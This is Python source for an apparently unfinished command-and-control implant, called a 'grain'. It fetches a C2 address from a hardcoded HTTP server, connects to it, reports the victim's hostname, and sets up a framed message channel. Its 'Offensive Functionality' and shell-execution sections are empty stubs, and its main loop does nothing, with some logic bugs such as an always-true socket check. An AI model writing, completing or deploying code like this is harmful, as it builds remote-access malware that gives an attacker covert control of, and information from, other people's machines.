import socket
import subprocess
import requests

http_server = "192.168.1.16:8080"


# ----------- Communication Functionality -----------
# |_----------- Getting C2 Address -----------
def get_c2():
    global http_server

    response = requests.get("http://" + http_server + "/")
    c2_server = response.text
    return c2_server


# |_----------- Authenticating to C2 -----------
def c2_auth(c2_srv):
    try:
        master_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        master_socket.connect((c2_server[0], int(c2_server[1])))

    except Exception as err:
        print("[!] Error while authenticating: " + str(err))

    else:
        hostname = socket.gethostname()
        auth_msg = "sand_grain;" + hostname
        master_socket.send(auth_msg.encode())
        results_msg = master_socket.recv(2048)
        results_msg = results_msg.decode()

        if "Established" in results_msg:
            return master_socket

        else:
            return 0

    return 1


# |_----------- C2 Communication Formatting -----------
def recv_ex(ssocket):
    data = ssocket.recv(2048)
    data = data.decode()

    if "[+]SandEnd[+]" in data:
        data = data.replace("[+]SandStart[+]", "")
        return data.replace("[+]SandEnd[+]", "")

    else:
        main_data = ""
        main_data += data
        data = ssocket.recv(2048)
        data = data.decode()
        main_data += data
        while "[+]SandEnd[+]" not in data:
            data = ssocket.recv(2048)
            data = data.decode()
            main_data += data
        main_data = main_data.replace("[+]SandStart[+]", "")
        return main_data.replace("[+]SandEnd[+]", "")


def send_ex(ssocket, info):
    info = "[+]SandStart[+]" + info + "[+]SandEnd[+]"
    ssocket.send(info.encode())


# ----------- Offensive Functionality -----------
# |_ ----------- Shell / Scripts Execution -----------


# ----------- Main Function -----------
def active_grain_main(master_socket):
    pass


# ----------- Configuration Variables -----------
# ----------- Initializing Grain -----------
try:
    c2_server = get_c2()
    c2_server = c2_server.split(":")

    # Authenticating to server
    c2_socket = c2_auth(c2_server)
    if c2_socket != 0 or c2_socket != 1:
        active_grain_main(c2_socket)

    c2_socket.close()
except Exception as err:
    print("[!] Error while initiating grain: " + str(err))
